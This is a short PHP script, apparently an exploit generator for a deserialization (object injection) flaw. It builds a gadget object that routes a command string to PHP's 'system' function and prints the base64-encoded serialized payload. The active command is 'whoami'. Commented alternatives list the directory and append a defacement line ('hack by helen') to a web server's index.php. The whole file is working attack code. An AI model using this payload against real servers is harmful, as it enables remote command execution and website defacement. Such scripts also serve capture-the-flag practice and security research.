<?php
class getshell
{
    public function __construct()
    {
        $this->hello = ['nihao' => 'system'];
    }

}

class b
{
    public function __construct()
    {
        $this->x = new getshell();
        #$this->y = "echo '# hack by helen' >> /var/www/html/index.php";
        #$this->y = "pwd";
        #$this->y = "ls -al";
        $this->y = "whoami";
    }
}

echo base64_encode(serialize(new b));
